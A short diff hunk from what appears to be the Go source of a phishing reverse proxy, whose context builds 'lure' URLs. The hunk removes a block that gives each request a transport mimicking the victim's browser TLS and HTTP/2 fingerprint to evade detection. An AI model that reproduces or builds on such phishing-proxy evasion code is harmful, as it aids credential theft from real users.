@@ -248,12 +248,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 			}
 
-			// --- START: DYNAMIC TLS & HTTP/2 SWITCHING (Pooled) ---
-			// Assigns a cached transport that mimics the victim's browser fingerprint
-			// This overrides the default proxy dialer for this specific request.
-			ctx.RoundTripper = p.getOrCreateTransport(userAgent)
-			// --- END: DYNAMIC TLS & HTTP/2 SWITCHING ---
-
 			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
 			o_host := req.Host
 			lure_url := req_url
